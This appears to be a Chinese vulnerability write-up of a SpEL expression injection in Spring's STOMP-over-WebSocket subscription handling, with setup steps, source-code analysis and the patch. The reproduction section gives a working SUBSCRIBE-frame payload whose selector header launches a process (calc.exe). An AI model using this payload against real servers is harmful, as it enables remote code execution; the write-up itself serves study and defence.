@@ -1,0 +1,93 @@
+## 环境搭建
+地址：  
+Idea导入pom.xml  
+点击Edit Configurations  
+点击+，选择Maven  
+Command line处写入：spring-boot:run  
+## 漏洞复现
+访问, 点击connect后进行抓包，当出现’WebSockets message
+to’即向服务端发送消息时修改内容为如下：
+    ["SUBSCRIBE\nid:sub-0\ndestination:/topic/greetings\nselector:new java.lang.ProcessBuilder('calc.exe').start()  \n\n\u0000"]
+回到页面，随便输入内容，点击send，弹出计算器
+## 漏洞分析
+Websocket是html5提出的一个协议规范，是为解决客户端与服务端实时通信，在建立连接之后，双方可以在任意时刻，相互推送信息。  
+websocket定义了文本信息和二进制信息两种传输信息类型，虽然定义了类型但是没有定义传输体，而STOMP是面向消息的简单文本协议，是websocket的子协议，主要规定传输内容。  
+STOMP协议的帧以commnand字符串开始，以EOL结束，常用的commnand有：CONNECT、CONNECTED、SEND、SUBSRIBE、UNSUBSRIBE、BEGIN、COMMIT、ABORT、ACK、NACK、DISCONNECT。其中SUBSCRIBE为订阅消息以及注册订阅的目的地，SEND为发送消息。
+当发送SUBSRIBE消息时调用DefaultSubscriptionRegistry类中的addSubscriptionInternal方法，其中调用了this.expressionParser.parseExpression
+    protected void addSubscriptionInternal(String sessionId, String subsId, String destination, Message message) {
+        Expression expression = null;
+        MessageHeaders headers = message.getHeaders();
+        String selector = SimpMessageHeaderAccessor.getFirstNativeHeader(this.getSelectorHeaderName(), headers);
+        if (selector != null) {
+            try {
+                expression = this.expressionParser.parseExpression(selector);
+                this.selectorHeaderInUse = true;
+                if (this.logger.isTraceEnabled()) {
+                    this.logger.trace("Subscription selector: [" + selector + "]");
+                }
+            } catch (Throwable var9) {
+                if (this.logger.isDebugEnabled()) {
+                    this.logger.debug("Failed to parse selector: " + selector, var9);
+                }
+            }
+        }
+        this.subscriptionRegistry.addSubscription(sessionId, subsId, destination, expression);
+        this.destinationCache.updateAfterNewSubscription(destination, sessionId, subsId);
+this.expressionParser是类刚开始定义的为’new SpelExpressionParser()’，即spel表达式
+其中selector参数为headers中的selector字段，通过getFirstNativeHeader函数取得  
+跟进getFirstNativeHeader函数
+主要是先取出headers中的NATIVE_HEADERS，然后再根据headerName取出对应的值，这里headerName也是类刚开始定义的为selector
+当selector不为空时即解析spel表达式，所以可以在发送订阅消息时通过指定selector字段插入恶意payload  
+然后将解析后的表达式传入DefaultSubscriptionRegistry类的addSubscription方法，这里根据sessionid生成info
+跟进addSubscription方法，主要根据消息中的目的地址destination生成subs，然后将表达式和订阅消息的id保存到subs中
+同时调用了DefaultSubscriptionRegistry类的Subscription函数，将表达式和订阅消息的id赋值给成员变量
+在发送SEND消息时会调用AbstractSubscriptionRegistry类的filterSubscriptions方法，而该方法最终调用了getValue方法触发漏洞
+这里遍历allMatches中的sessionId，然后根据sessionId取得对应的subId和info，然后调用getSubscription函数取得对应的sub
+    EvaluationContext context = null;
+    MultiValueMap result = new LinkedMultiValueMap<>(allMatches.size());
+    for (String sessionId : allMatches.keySet()) {
+       for (String subId : allMatches.get(sessionId)) {
+          SessionSubscriptionInfo info = this.subscriptionRegistry.getSubscriptions(sessionId);
+          if (info == null) {
+             continue;
+          }
+          Subscription sub = info.getSubscription(subId);
+          if (sub == null) {
+             continue;
+          }
+          Expression expression = sub.getSelectorExpression();
+          if (expression == null) {
+             result.add(sessionId, subId);
+             continue;
+          }
+          if (context == null) {
+             context = new StandardEvaluationContext(message);
+             context.getPropertyAccessors().add(new SimpMessageHeaderPropertyAccessor());
+          }
+          try {
+             if (Boolean.TRUE.equals(expression.getValue(context, Boolean.class))) {
+                result.add(sessionId, subId);
+跟进getSubscription函数  
+先获取目的地址destinationEntry再取得地址下保存的subs，最后遍历subs和传入的subId比较，如果传入的subId存在则返回
+    public Subscription getSubscription(String subscriptionId) {
+       for (Map.Entry> destinationEntry :
+             this.destinationLookup.entrySet()) {
+          Set subs = destinationEntry.getValue();
+          if (subs != null) {
+             for (Subscription sub : subs) {
+                if (sub.getId().equalsIgnoreCase(subscriptionId)) {
+                   return sub;
+                }
+             }
+          }
+       }
+       return null;
+    }
+最后根据得到的sub取得表达式，调用getValue方法触发spel表达式注入
+这里的allMatches来自DefaultSubscriptionRegistry类的findSubscriptionsInternal函数
+所以整个漏洞触发分为两部分：
+    通过发送SUBSRIBE消息解析表达式并保存到消息指定的目的地址下
+    当发送SEND消息时会从目的地址下获取所有的存根，遍历存根并获取对应的表达式并调用getValue方法触发漏洞
+由于这里连续发送了两次带有payload的订阅消息，目的地址下保存了两个sessionid和subid，所以弹了两次计算器
+## 补丁分析
+将StandardEvaluationContext修改为SimpleEvaluationContext，后者不支持JAVA类型引用、构造函数及bean的引用。
